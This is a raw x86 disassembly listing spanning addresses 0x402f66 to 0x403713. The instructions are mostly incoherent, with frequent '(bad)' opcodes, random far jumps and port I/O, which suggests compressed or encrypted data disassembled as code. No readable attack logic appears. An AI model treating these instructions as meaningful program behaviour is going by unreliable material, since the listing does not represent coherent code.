  402f66:	xor    BYTE PTR ds:0xb08d1e55,0xf
  402f6d:	(bad)  
  402f6e:	push   ebp
  402f6f:	xchg   esp,eax
  402f70:	(bad)  
  402f71:	out    dx,al
  402f72:	mov    ah,0x14
  402f74:	xchg   dl,ch
  402f76:	in     eax,dx
  402f77:	or     edi,DWORD PTR [ebx-0x3cfc7be1]
  402f7d:	pop    ds
  402f7e:	inc    edx
  402f7f:	jbe    0x402fd3
  402f81:	nop
  402f82:	xor    DWORD PTR [eax],esp
  402f84:	sbb    ebx,DWORD PTR [eax]
  402f86:	add    DWORD PTR [esi-0x41896804],ecx
  402f8c:	mov    eax,ds:0xbfae943c
  402f91:	xchg   esi,eax
  402f92:	les    ecx,FWORD PTR [esi-0x12]
  402f95:	xor    esp,DWORD PTR [ebp+0x2f]
  402f98:	push   ebx
  402f99:	(bad)  
  402f9a:	fxch   st(6)
  402f9c:	sub    al,bh
  402f9e:	dec    esi
  402f9f:	shl    ecx,0x46
  402fa2:	adc    BYTE PTR [eax-0x288a46fe],0xbd
  402fa9:	rcr    DWORD PTR [eax+0x5c],cl
  402fac:	xchg   DWORD PTR [edx],esi
  402fae:	adc    BYTE PTR [edi],bl
  402fb0:	push   ebx
  402fb1:	cmp    ebp,DWORD PTR [esi]
  402fb3:	jecxz  0x402fe0
  402fb5:	cmc    
  402fb6:	jb     0x402f9d
  402fb8:	push   edx
  402fb9:	repz jle 0x40301c
  402fbc:	dec    ebx
  402fbd:	mov    ebp,0x8f0918f7
  402fc2:	xchg   ebp,eax
  402fc3:	imul   edi,DWORD PTR [edx],0xf94c8068
  402fc9:	test   BYTE PTR [edi-0x5f],cl
  402fcc:	push   edi
  402fcd:	out    0x2a,eax
  402fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd0:	sbb    dl,BYTE PTR [ecx-0x74]
  402fd3:	adc    eax,0x3cc7c473
  402fd8:	push   es
  402fd9:	inc    edx
  402fda:	xor    BYTE PTR [edi],bh
  402fdc:	arpl   bp,di
  402fde:	scas   eax,DWORD PTR es:[edi]
  402fdf:	in     al,0xcd
  402fe1:	jecxz  0x402f69
  402fe3:	arpl   ax,bx
  402fe5:	pop    ecx
  402fe6:	mov    WORD PTR [ecx+0x42c64b77],cs
  402fec:	or     bl,BYTE PTR [edx-0x33]
  402fef:	(bad)  
  402ff0:	ret    0xd9bc
  402ff3:	cmp    ebp,ebx
  402ff5:	pop    edx
  402ff6:	mov    WORD PTR [ebp-0x3a5ef4b1],ss
  402ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ffd:	mov    edx,0x10842dd5
  403002:	fidivr WORD PTR [esi-0x43]
  403005:	dec    esp
  403006:	sub    al,0xb4
  403008:	ret    
  403009:	mov    DWORD PTR [edx-0x36],edi
  40300c:	outs   dx,DWORD PTR ds:[esi]
  40300d:	ret    0x9c1f
  403010:	dec    esp
  403011:	add    eax,0xc62a8550
  403016:	pusha  
  403017:	pop    ebx
  403018:	pop    es
  403019:	ins    DWORD PTR es:[edi],dx
  40301a:	cld    
  40301b:	or     eax,0x56a4bce1
  403020:	cmp    eax,0x410d3771
  403025:	jmp    0x217f:0x7f16d
  40302c:	fcmovbe st,st(1)
  40302e:	daa    
  40302f:	pop    eax
  403030:	inc    ebp
  403031:	(bad)  
  403032:	call   0x93e6:0x8544bb8b
  403039:	je     0x40300a
  40303b:	xor    eax,ebp
  40303d:	dec    esp
  40303e:	push   ss
  40303f:	jbe    0x403096
  403041:	jbe    0x40306c
  403043:	add    DWORD PTR [ecx],ecx
  403045:	xchg   edx,eax
  403046:	ins    BYTE PTR es:[edi],dx
  403047:	xor    DWORD PTR [edi+ebx*2],esi
  40304a:	inc    ebp
  40304b:	sub    eax,0x26888f0
  403050:	dec    eax
  403051:	addr16 add al,ah
  403054:	clc    
  403055:	clc    
  403056:	ja     0x403091
  403058:	sub    al,0xf1
  40305a:	mov    ebp,0xbfcd832e
  40305f:	pop    edx
  403060:	clc    
  403061:	jg     0x403065
  403063:	inc    edx
  403064:	dec    edi
  403065:	jb     0x4030d2
  403067:	jb     0x403089
  403069:	ja     0x403010
  40306b:	sub    DWORD PTR [esi-0x7bd86b1f],esp
  403071:	loop   0x4030ab
  403073:	mul    BYTE PTR [eax-0x50c31c7b]
  403079:	leave  
  40307a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40307b:	popf   
  40307c:	add    DWORD PTR [ebp+edi*4+0x745397d7],0xffffffa3
  403084:	or     BYTE PTR [edi+0x53],dl
  403087:	sbb    eax,0x221650a1
  40308c:	test   BYTE PTR [eax+edi*8-0x59],ah
  403090:	popf   
  403091:	lock add bh,al
  403094:	out    dx,eax
  403095:	jle    0x4030a0
  403097:	sub    eax,0x3f9a7fdb
  40309c:	int3   
  40309d:	mov    edx,0x8a5099a9
  4030a2:	xor    eax,0x78544fef
  4030a7:	loop   0x40307f
  4030a9:	test   al,0x73
  4030ac:	sub    BYTE PTR [edx],ah
  4030ae:	xchg   ebx,eax
  4030af:	dec    eax
  4030b0:	les    ebp,FWORD PTR [eax]
  4030b2:	pop    esp
  4030b3:	adc    BYTE PTR [eax-0x14],0xb2
  4030b7:	call   0xa1ef:0x66971dca
  4030be:	and    eax,0xf40456fe
  4030c3:	dec    edx
  4030c4:	scas   al,BYTE PTR es:[edi]
  4030c5:	jo     0x40309a
  4030c7:	sbb    dh,BYTE PTR [eax-0x21]
  4030ca:	mov    BYTE PTR [edx+0x62d7023b],dl
  4030d0:	pusha  
  4030d1:	push   cs
  4030d2:	xchg   BYTE PTR [esi],cl
  4030d4:	lea    edx,[esp+edx*1+0x73]
  4030d8:	xchg   edi,eax
  4030d9:	scas   al,BYTE PTR es:[edi]
  4030da:	in     eax,0x6d
  4030dc:	push   esi
  4030dd:	jae    0x4030d2
  4030df:	mov    eax,0xa20013bb
  4030e4:	outs   dx,BYTE PTR ds:[esi]
  4030e5:	mov    dl,0xe5
  4030e7:	xor    eax,ebp
  4030e9:	xor    ch,BYTE PTR [ecx-0x1a]
  4030ec:	dec    ecx
  4030ed:	adc    BYTE PTR [ebx+0x67a165cf],dl
  4030f3:	loopne 0x40309d
  4030f5:	ds jg  0x403104
  4030f8:	sub    ebx,DWORD PTR [edx]
  4030fa:	inc    esp
  4030fb:	dec    ecx
  4030fc:	ss or  eax,0xd674c072
  403102:	pop    ebx
  403103:	pop    edi
  403104:	dec    ebp
  403105:	and    eax,0xfac5bbe1
  40310a:	outs   dx,DWORD PTR ds:[esi]
  40310b:	lods   eax,DWORD PTR ds:[esi]
  40310c:	call   0x5f6:0x5392c0e0
  403113:	sub    bl,cl
  403115:	pop    esp
  403116:	(bad)  
  403117:	dec    eax
  403118:	xor    dh,dl
  40311a:	push   ebx
  40311b:	cmp    BYTE PTR [edi+0x4e1d0dda],dl
  403121:	cmp    al,0xa1
  403123:	and    edi,DWORD PTR [ebx-0x7f]
  403126:	out    0x7a,al
  403128:	pop    es
  403129:	mov    ch,0x18
  40312b:	pop    esp
  40312c:	idiv   DWORD PTR [ecx+0x8]
  40312f:	sbb    esp,edi
  403131:	mov    ebp,0x1ba5d2b4
  403136:	enter  0xb253,0x77
  40313a:	icebp  
  40313b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40313c:	js     0x403158
  40313e:	sbb    eax,DWORD PTR [ebx+eax*2]
  403141:	xor    BYTE PTR [edi+edi*8],ah
  403144:	bound  ecx,QWORD PTR [ebp+0x68b5c0f1]
  40314a:	inc    esi
  40314b:	in     eax,dx
  40314c:	test   BYTE PTR [eiz*8+0x20e7fe4e],dh
  403153:	mov    al,ds:0xe38ec9db
  403158:	ret    
  403159:	enter  0xbc92,0x9b
  40315d:	mov    BYTE PTR [edi+0x55],dl
  403160:	inc    ebx
  403161:	pop    edx
  403162:	jb     0x4031a7
  403164:	jmp    0x9eb4eecd
  403169:	jmp    0x403182
  40316b:	sbb    BYTE PTR [ecx+0x7b8aae3c],al
  403171:	cmp    dl,BYTE PTR ds:0x898747be
  403177:	add    DWORD PTR ds:0x9914bfd8,ebx
  40317d:	(bad)  
  40317e:	loop   0x403154
  403180:	sbb    BYTE PTR [eax+0x55e14246],dh
  403186:	jae    0x403205
  403188:	call   0xf8df8b67
  40318d:	mov    esp,DWORD PTR [edi+0x1b]
  403190:	mov    ebx,0xe56a5026
  403195:	inc    edx
  403196:	or     al,0x29
  403198:	mov    edx,DWORD PTR fs:[edx-0x5b8dd0e3]
  40319f:	mov    al,ds:0x2b393e88
  4031a4:	enter  0xa690,0xd2
  4031a8:	add    DWORD PTR [edx],0x53
  4031ab:	dec    ebp
  4031ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031ad:	hlt    
  4031ae:	pop    edi
  4031af:	test   BYTE PTR [ebx],dl
  4031b1:	pop    ss
  4031b2:	pop    eax
  4031b3:	push   ebx
  4031b4:	sbb    eax,0xd6c37f7c
  4031b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ba:	push   cs
  4031bb:	sub    DWORD PTR [edi+0x35da5a3],esp
  4031c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031c2:	xchg   esi,eax
  4031c3:	sub    BYTE PTR ds:0x7fc7695,bh
  4031c9:	iret   
  4031ca:	xchg   esp,eax
  4031cb:	jecxz  0x403239
  4031cd:	sub    eax,0xca153bbc
  4031d2:	inc    ecx
  4031d3:	sub    DWORD PTR [ecx],0xe711abb0
  4031d9:	pop    eax
  4031da:	int    0xd9
  4031dc:	cld    
  4031dd:	cwde   
  4031de:	push   esi
  4031df:	not    BYTE PTR [ecx-0x78]
  4031e2:	push   es
  4031e3:	and    ah,BYTE PTR [eax-0x5264ca6d]
  4031e9:	mov    esp,0xdfb13e41
  4031ee:	dec    eax
  4031ef:	push   ds
  4031f0:	loope  0x40323f
  4031f2:	(bad)  
  4031f3:	lock mov BYTE PTR [edx-0x31b5e11e],bl
  4031fa:	daa    
  4031fb:	test   ebp,eax
  4031fd:	sub    eax,0xcd6cf299
  403202:	cmc    
  403203:	fs jnp 0x403248
  403206:	pop    eax
  403207:	fisttp QWORD PTR gs:[eax-0x5c]
  40320b:	sub    edx,DWORD PTR [edi+edi*8+0x43]
  40320f:	adc    bh,bl
  403211:	mov    ebp,0x54d70aa4
  403216:	mov    BYTE PTR ds:0xe516f240,bh
  40321c:	cmp    al,0xe3
  40321e:	and    al,0x65
  403220:	pop    es
  403221:	dec    ebp
  403222:	fidiv  DWORD PTR [ebx]
  403224:	ror    DWORD PTR [ebx-0x7],cl
  403227:	pop    esi
  403229:	push   ecx
  40322a:	cli    
  40322b:	pop    edx
  40322c:	and    al,0xf
  40322e:	into   
  40322f:	xchg   ebp,eax
  403230:	fstp   TBYTE PTR [esi-0x5e39d77]
  403236:	scas   al,BYTE PTR es:[edi]
  403237:	dec    ebp
  403238:	iret   
  403239:	sub    esi,DWORD PTR [eax-0x3]
  40323c:	jbe    0x4031d5
  40323e:	out    dx,al
  40323f:	pop    ebx
  403240:	xchg   ecx,eax
  403241:	pusha  
  403242:	ret    0x6313
  403245:	sbb    bl,BYTE PTR [eax-0x410f3060]
  40324b:	ror    DWORD PTR [ebx],0xd6
  40324e:	sbb    ecx,DWORD PTR [esi+0x6d2a9c68]
  403254:	iret   
  403255:	fstp   TBYTE PTR [esi+0x36]
  403258:	imul   esi,DWORD PTR [eax-0x71],0x3d
  40325c:	pusha  
  40325d:	iret   
  40325e:	out    0x64,al
  403260:	pop    edi
  403261:	fnstsw WORD PTR [ecx-0x27ff6a1]
  403267:	fimul  DWORD PTR [eax-0x44]
  40326a:	push   es
  40326b:	and    al,0x59
  40326d:	aaa    
  40326e:	adc    cl,ch
  403270:	fabs   
  403272:	dec    eax
  403273:	rol    ch,1
  403275:	data16 or BYTE PTR [ebp+ebx*2+0x3b6c6b64],ah
  40327d:	push   esi
  40327e:	and    esi,DWORD PTR [edx+0x7d]
  403281:	retf   0x9a6d
  403284:	das    
  403285:	aad    0x3e
  403287:	cmc    
  403288:	sub    eax,0xd67553c3
  40328d:	dec    esp
  40328e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40328f:	mov    ecx,0x75d9b025
  403294:	int3   
  403295:	sbb    BYTE PTR [eax-0x692f4971],cl
  40329b:	clc    
  40329c:	and    DWORD PTR [ebp+0x40dc962a],eax
  4032a2:	jne    0x403303
  4032a4:	mov    ds,WORD PTR [esi-0x7a]
  4032a7:	adc    al,0x6c
  4032a9:	ror    BYTE PTR [ecx],cl
  4032ab:	dec    ecx
  4032ac:	arpl   WORD PTR [edi+ebp*1],ax
  4032af:	jmp    0x2c4a2f77
  4032b4:	fcmovnb st,st(4)
  4032b6:	jp     0x4032a5
  4032b8:	imul   esi,esi,0xeb4a543d
  4032be:	lods   eax,DWORD PTR ds:[esi]
  4032bf:	xor    ah,BYTE PTR [edi-0x40b0b142]
  4032c5:	inc    ebx
  4032c6:	adc    eax,0x555e1db8
  4032cb:	lea    ecx,[edi+edi*2+0x4e]
  4032cf:	and    BYTE PTR [eax-0x2172bba3],cl
  4032d5:	sbb    BYTE PTR ds:0x3b757d71,bh
  4032db:	add    BYTE PTR [eax+0x42],al
  4032de:	int    0xa7
  4032e0:	das    
  4032e1:	jg     0x40327d
  4032e3:	adc    al,0x76
  4032e5:	in     eax,0x13
  4032e7:	cmp    DWORD PTR [ebx-0x4e3c18b4],0x4b638c98
  4032f1:	pop    ecx
  4032f2:	jbe    0x40335d
  4032f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032f5:	mov    eax,0x751dac64
  4032fa:	sub    esi,DWORD PTR [edi]
  4032fc:	loopne 0x40330e
  4032fe:	retf   0x2c6e
  403301:	or     al,0x46
  403303:	and    dl,cl
  403305:	jg     0x40329a
  403307:	jmp    0x4032bc
  403309:	xchg   esp,eax
  40330a:	fsubr  st,st(6)
  40330c:	out    0x2d,eax
  40330e:	jge    0x4032c1
  403310:	inc    ebx
  403311:	cmp    edi,eax
  403313:	in     al,dx
  403314:	cdq    
  403315:	xchg   ebx,eax
  403316:	xlat   BYTE PTR ds:[ebx]
  403317:	fisubr WORD PTR [ebp+0x51]
  40331a:	push   edi
  40331b:	out    0xb0,eax
  40331d:	cwde   
  40331e:	adc    BYTE PTR [esi],ah
  403320:	sub    ebx,DWORD PTR [edi]
  403322:	and    cl,BYTE PTR [eax-0x4ce4a596]
  403328:	in     al,0xeb
  40332a:	or     esi,edx
  40332c:	sub    DWORD PTR [esi+0x2a7d101b],0x3bce2308
  403336:	jo     0x403323
  403338:	les    esp,FWORD PTR [eax-0x73]
  40333b:	lds    esi,FWORD PTR [edx-0x1e]
  40333e:	in     eax,dx
  40333f:	jg     0x403391
  403341:	add    DWORD PTR ds:0x50577865,0xfffffff1
  403348:	arpl   di,ax
  40334a:	xor    dh,dl
  40334c:	push   ecx
  40334d:	sbb    DWORD PTR [esi+0x34],esi
  403350:	call   FWORD PTR [esi+eiz*8-0x75497d10]
  403357:	sub    al,0xdd
  403359:	push   eax
  40335a:	cmp    edi,DWORD PTR ds:0xda431afc
  403360:	aaa    
  403361:	push   eax
  403362:	aam    0xaf
  403364:	in     eax,dx
  403365:	imul   edi,DWORD PTR [ebx+ecx*4],0x15
  403369:	or     al,0xd
  40336b:	leave  
  40336c:	mov    edi,0x500e544b
  403371:	mov    al,0xa9
  403373:	stc    
  403374:	inc    ebp
  403375:	int    0x4
  403377:	(bad)  
  403379:	(bad)  
  40337a:	adc    bl,bl
  40337c:	jne    0x403326
  40337e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40337f:	sbb    dh,BYTE PTR [ecx+0xde3070b]
  403385:	sbb    bh,BYTE PTR [edi-0x608de940]
  40338b:	xchg   edi,eax
  40338c:	push   es
  40338d:	cmp    al,0x78
  40338f:	ret    
  403390:	mov    ds:0xfb896466,al
  403395:	push   es
  403396:	mov    BYTE PTR [esi],bl
  403398:	xor    al,0xec
  40339a:	stc    
  40339b:	xchg   edi,eax
  40339c:	in     al,0x33
  40339e:	rcr    BYTE PTR [edx+ebp*2],0xc0
  4033a2:	ins    DWORD PTR es:[edi],dx
  4033a3:	push   ds
  4033a4:	aam    0xee
  4033a6:	sub    dl,BYTE PTR [esp+esi*4]
  4033a9:	jmp    DWORD PTR [eax]
  4033ab:	lock retf 
  4033ad:	xor    edi,edi
  4033af:	adc    BYTE PTR [ebx-0xe],bh
  4033b2:	gs adc al,0xc3
  4033b5:	fcmovu st,st(6)
  4033b7:	xchg   edx,eax
  4033b8:	xor    bl,BYTE PTR [edx+0x1b]
  4033bb:	cs hlt 
  4033bd:	(bad)  
  4033be:	xlat   BYTE PTR ds:[ebx]
  4033bf:	mov    cl,0xde
  4033c1:	adc    al,0xce
  4033c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033c4:	adc    BYTE PTR [esi+ebp*8-0x29],bh
  4033c8:	mov    bh,0x9b
  4033ca:	cmp    al,0xad
  4033cc:	fld    QWORD PTR [ebp+eax*1-0x3a]
  4033d0:	retf   
  4033d1:	mov    dl,0x6c
  4033d3:	jo     0x403393
  4033d5:	cli    
  4033d6:	dec    ebp
  4033d7:	push   ebp
  4033d8:	(bad)  
  4033d9:	mov    edi,?
  4033db:	sub    eax,0x79b18cbf
  4033e0:	cmp    esi,DWORD PTR [ebx-0xb1fc160]
  4033e6:	mov    esi,0x5e279dad
  4033eb:	jl     0x403469
  4033ed:	xchg   edi,eax
  4033ee:	or     al,0xfd
  4033f0:	add    eax,0x3d67152a
  4033f5:	push   es
  4033f6:	lods   al,BYTE PTR ds:[esi]
  4033f7:	xchg   esp,eax
  4033f8:	jno    0x403430
  4033fa:	sahf   
  4033fb:	push   0xffffffa3
  4033fd:	jmp    0x2317:0x410aeae1
  403404:	aas    
  403405:	fist   WORD PTR [edi+0x3c]
  403408:	je     0x403483
  40340a:	imul   ecx,edi,0xffffffc0
  40340d:	inc    edx
  40340e:	mov    ds:0xdd801ccc,eax
  403413:	lods   al,BYTE PTR ds:[esi]
  403414:	stos   BYTE PTR es:[edi],al
  403415:	(bad)  
  403416:	stos   DWORD PTR es:[edi],eax
  403417:	sbb    BYTE PTR ds:0x4e2764b9,ch
  40341d:	xor    esp,DWORD PTR [eax-0x3ff58dfb]
  403423:	adc    dl,BYTE PTR [edx+edx*2-0xa]
  403427:	shl    BYTE PTR [ecx],cl
  403429:	pop    ecx
  40342a:	nop
  40342b:	cwde   
  40342c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40342d:	or     ch,BYTE PTR [esi+ecx*8]
  403430:	lods   al,BYTE PTR ds:[esi]
  403431:	adc    bh,BYTE PTR [ebx+0x0]
  403434:	fs enter 0x1425,0xbe
  403439:	call   0x6a7b:0x681e3d31
  403440:	loope  0x403466
  403442:	pmulhuw mm7,QWORD PTR [edi]
  403445:	outs   dx,DWORD PTR ds:[esi]
  403446:	jecxz  0x403473
  403448:	fcomp  QWORD PTR [eax]
  40344a:	xor    eax,0xb65419cc
  40344f:	(bad)  
  403450:	call   0x4c4c:0x74ce1d08
  403457:	push   esi
  403458:	cmp    eax,0x6a062c6
  40345d:	inc    esi
  40345e:	push   0x860eb6d3
  403463:	cmp    eax,0xdb7e6365
  403468:	iret   
  403469:	loope  0x40348c
  40346b:	pop    edx
  40346c:	outs   dx,DWORD PTR ds:[esi]
  40346d:	dec    ebp
  40346e:	ins    BYTE PTR es:[edi],dx
  40346f:	mov    WORD PTR [edi-0x17],?
  403472:	daa    
  403473:	or     BYTE PTR [ebp+0x7],cl
  403476:	nop
  403477:	cmp    BYTE PTR [ebp+0x6c],0x20
  40347b:	add    bl,BYTE PTR [eax-0x26614776]
  403481:	inc    eax
  403482:	pop    eax
  403483:	nop
  403484:	inc    edx
  403485:	mov    dh,0x6
  403487:	bound  eax,QWORD PTR [edi]
  403489:	bound  edi,QWORD PTR [ecx-0x9]
  40348c:	loopne 0x40344f
  40348e:	lods   al,BYTE PTR ds:[esi]
  40348f:	mov    edx,0x9839520d
  403494:	(bad)  
  403495:	mov    cl,0x4b
  403497:	in     eax,dx
  403498:	mov    dl,0x37
  40349a:	dec    ecx
  40349b:	mov    bl,0x4a
  40349d:	in     eax,0xdd
  40349f:	rcl    eax,0x72
  4034a2:	arpl   WORD PTR [edx+0x66ad83a8],bx
  4034a8:	dec    esp
  4034a9:	icebp  
  4034aa:	arpl   WORD PTR [ecx],si
  4034ac:	mov    esp,0xbe19d7b0
  4034b1:	test   dh,al
  4034b3:	mov    edx,0x47e01466
  4034b8:	enter  0x1587,0x73
  4034bc:	xchg   ebx,eax
  4034bd:	sbb    al,0xe8
  4034bf:	mov    al,ds:0x13944330
  4034c4:	add    DWORD PTR [edi-0x49],esi
  4034c7:	sar    ecx,1
  4034c9:	and    ebp,DWORD PTR [ebp+0x1e]
  4034cc:	sub    bl,ah
  4034ce:	cmc    
  4034cf:	push   ecx
  4034d0:	loop   0x403551
  4034d2:	lock (bad) 
  4034d4:	in     eax,dx
  4034d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034d6:	(bad)  
  4034d7:	cmp    al,0x97
  4034d9:	xlat   BYTE PTR ds:[ebx]
  4034da:	fbld   TBYTE PTR [eax+ebx*8]
  4034dd:	popf   
  4034de:	push   0x9d89dabd
  4034e3:	bnd jno 0x40348b
  4034e6:	sbb    BYTE PTR [edi],bh
  4034e8:	mov    al,ds:0x22f6b6d0
  4034ed:	xor    al,0x7d
  4034ef:	retf   0x2309
  4034f2:	out    dx,eax
  4034f3:	lea    edx,[esi-0x1f76be14]
  4034f9:	xchg   ebp,eax
  4034fa:	loope  0x403505
  4034fc:	jmp    DWORD PTR [ebx+ecx*8-0x2e16f130]
  403503:	ja     0x4034ef
  403505:	cmp    eax,0x177cde7d
  40350a:	fs (bad) 
  40350c:	jecxz  0x403565
  40350e:	(bad)  
  40350f:	lods   al,BYTE PTR ds:[esi]
  403510:	(bad)  
  403511:	fist   DWORD PTR [edx]
  403513:	shl    DWORD PTR [edx-0x19f650c7],1
  403519:	popa   
  40351a:	(bad)
  40351e:	popf   
  40351f:	mov    fs,WORD PTR ds:0xff8bcc6d
  403525:	enter  0xe056,0x93
  403529:	add    al,0x6a
  40352b:	sub    al,0xdc
  40352d:	or     DWORD PTR [eax+eax*4+0x52],ecx
  403531:	aaa    
  403532:	dec    eax
  403533:	(bad)  
  403534:	cmp    eax,0x55b7d9a5
  403539:	into   
  40353a:	std    
  40353b:	cmp    ecx,ebx
  40353d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40353e:	inc    edx
  40353f:	and    esi,DWORD PTR [ebp-0x33]
  403542:	or     ch,ch
  403544:	mov    ds:0xd249894,al
  403549:	in     al,0x45
  40354b:	lea    edi,[esi]
  40354d:	neg    ch
  40354f:	out    0x87,al
  403551:	popa   
  403552:	add    al,0x3f
  403554:	mov    ebx,DWORD PTR [esi-0x2e]
  403557:	sub    al,BYTE PTR [ebx]
  403559:	push   ebp
  40355a:	xchg   esi,eax
  40355b:	sub    eax,0x93988cd0
  403560:	mov    eax,0xc848a1d3
  403565:	push   DWORD PTR [eax-0x5cf30d0b]
  40356b:	add    al,0x17
  40356d:	pop    ss
  40356e:	loope  0x4035e4
  403570:	xor    ch,BYTE PTR [ebp+0x7eafa19d]
  403576:	add    bl,cl
  403578:	pop    ss
  403579:	mov    ds:0xc27ab708,al
  40357e:	arpl   WORD PTR [ebx+0x3945e7ff],dx
  403584:	scas   al,BYTE PTR es:[edi]
  403585:	mov    bl,0x5f
  403587:	sub    edi,DWORD PTR [ebp+0x3b]
  40358a:	iret   
  40358b:	xlat   BYTE PTR ds:[ebx]
  40358c:	js     0x4035df
  40358e:	iret   
  40358f:	xchg   ecx,eax
  403590:	or     eax,0xc1d82198
  403595:	sbb    dl,BYTE PTR [edi]
  403597:	dec    ebp
  403598:	icebp  
  403599:	push   es
  40359a:	pop    esi
  40359b:	pop    ebp
  40359c:	xor    DWORD PTR [eax],eax
  40359e:	gs (bad) 
  4035a0:	js     0x4035a7
  4035a2:	(bad)  
  4035a3:	ja     0x403611
  4035a5:	cwde   
  4035a6:	jne    0x4035fb
  4035a8:	and    ecx,DWORD PTR [ebx+0x95aa61a]
  4035ae:	add    DWORD PTR [ecx-0x5c],esp
  4035b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b2:	mov    edi,0x521d0453
  4035b7:	arpl   WORD PTR [ebp-0x42fc3d08],sp
  4035bd:	ret    
  4035be:	fsubrp st(6),st
  4035c0:	jmp    0xee8c8eb4
  4035c5:	xchg   DWORD PTR [edi-0x27842651],edi
  4035cb:	rcr    ecx,1
  4035cd:	sub    esi,DWORD PTR [esi*8+0x6cb93375]
  4035d4:	mov    WORD PTR [ebp-0x67],?
  4035d7:	outs   dx,BYTE PTR ds:[esi]
  4035d8:	jno    0x403603
  4035da:	or     DWORD PTR [ebp-0x1da196a0],edi
  4035e0:	inc    esp
  4035e1:	adc    al,0x3c
  4035e3:	ja     0x403576
  4035e5:	outs   dx,DWORD PTR ds:[esi]
  4035e6:	cwde   
  4035e7:	std    
  4035e8:	clc    
  4035e9:	repz xchg esp,eax
  4035eb:	cmp    dh,BYTE PTR [ecx+edi*2+0x63a8d413]
  4035f2:	or     BYTE PTR [eax+0x2a],bh
  4035f5:	(bad)  
  4035f7:	call   0x53c8dc37
  4035fc:	jae    0x403654
  4035fe:	add    BYTE PTR [ebp-0x6d],bl
  403601:	add    ch,ah
  403603:	fdiv   QWORD PTR ss:[ebp-0x8d99ef8]
  40360a:	gs pop esp
  40360c:	inc    ecx
  40360d:	test   DWORD PTR [esi],0x6b332cc0
  403613:	xchg   edx,eax
  403614:	into   
  403615:	mov    ah,0xa3
  403617:	leave  
  403618:	in     eax,0x2c
  40361a:	inc    eax
  40361b:	cmp    BYTE PTR [eax],bh
  40361d:	push   es
  40361e:	loope  0x40367f
  403620:	test   edx,esi
  403622:	scas   al,BYTE PTR es:[edi]
  403623:	mov    eax,DWORD PTR [ecx+0x1]
  403626:	jg     0x403670
  403628:	test   eax,esi
  40362a:	mov    cl,0x16
  40362c:	sbb    esp,DWORD PTR [edx+0x33]
  40362f:	add    DWORD PTR [ebp+eax*8+0x1187723d],ebp
  403636:	out    0xb1,eax
  403638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403639:	or     al,0xb0
  40363b:	test   al,0xd2
  40363d:	test   edi,ebx
  40363f:	dec    edi
  403640:	stos   BYTE PTR es:[edi],al
  403641:	xor    DWORD PTR [eax-0x51becd52],0x21
  403648:	push   ss
  403649:	ins    BYTE PTR es:[edi],dx
  40364a:	aam    0x2
  40364c:	inc    ecx
  40364d:	stos   BYTE PTR es:[edi],al
  40364e:	xchg   edx,eax
  40364f:	out    0x17,al
  403651:	clc    
  403652:	outs   dx,DWORD PTR ds:[esi]
  403653:	cli    
  403654:	and    eax,0xf69ed9a0
  403659:	or     al,BYTE PTR [edx]
  40365b:	xchg   BYTE PTR fs:[edi],ch
  40365e:	cld    
  40365f:	fistp  QWORD PTR [edx-0x30]
  403662:	test   DWORD PTR ds:0xd797568c,ecx
  403668:	retf   0x7f63
  40366b:	cld    
  40366c:	cmp    DWORD PTR [esi+0x38],ecx
  40366f:	loope  0x403622
  403671:	ds adc al,0x6f
  403674:	aas    
  403675:	mov    ds:0xf61c1476,al
  40367a:	mov    es,esi
  40367c:	jns    0x4036aa
  40367e:	xor    eax,0x9ff8cb17
  403683:	out    0x61,al
  403685:	pushf  
  403686:	sub    al,0x3e
  403688:	dec    ecx
  403689:	rcr    DWORD PTR [edi+0x4b],cl
  40368c:	(bad)  
  40368e:	ds js  0x40370f
  403691:	push   eax
  403692:	stc    
  403693:	fidivr DWORD PTR [ebp+0x37]
  403696:	cld    
  403697:	cld    
  403698:	ins    DWORD PTR es:[edi],dx
  403699:	mov    ds:0xb2a3d617,eax
  40369e:	(bad)  
  40369f:	fimul  WORD PTR [esi-0x7a]
  4036a2:	xchg   ecx,eax
  4036a3:	out    dx,al
  4036a4:	adc    al,0xf7
  4036a6:	test   al,0x4f
  4036a8:	test   ebp,esi
  4036aa:	scas   eax,DWORD PTR es:[edi]
  4036ab:	call   0xf9e4:0x29db71e3
  4036b2:	dec    esi
  4036b3:	jmp    0x6938:0x9cfd0a7c
  4036ba:	jmp    0x8af332ea
  4036bf:	adc    al,0x47
  4036c1:	cmp    DWORD PTR ds:0x9d80defa,esi
  4036c7:	mov    ebp,0x390cab05
  4036cc:	mov    eax,ds:0xb0ac6239
  4036d1:	push   edi
  4036d2:	sbb    eax,0x5aad936a
  4036d7:	sub    DWORD PTR [eax],esp
  4036d9:	pop    esi
  4036da:	and    al,0x54
  4036dc:	pop    ss
  4036dd:	cmp    eax,0xdde355f2
  4036e2:	cmp    esi,DWORD PTR [edx+0x59]
  4036e5:	xchg   esp,eax
  4036e6:	aas    
  4036e7:	cmp    DWORD PTR ds:0x8afcb1e3,ecx
  4036ed:	sub    eax,0x400dddde
  4036f2:	and    ebp,ebx
  4036f4:	sub    DWORD PTR [ebx],eax
  4036f6:	int    0x41
  4036f8:	mov    ch,0x8a
  4036fa:	out    dx,al
  4036fb:	xor    BYTE PTR [eax+0xa],ch
  4036fe:	iret   
  4036ff:	nop
  403700:	aam    0xa5
  403702:	xor    DWORD PTR [edx],esi
  403704:	jb     0x403730
  403706:	inc    ecx
  403707:	into   
  403708:	sar    BYTE PTR [ecx-0x1ea0b2af],cl
  40370e:	jo     0x403694
  403710:	daa    
  403711:	pop    ds
  403712:	outs   dx,BYTE PTR ds:[esi]
  403713:	scas   eax,DWORD PTR es:[edi]
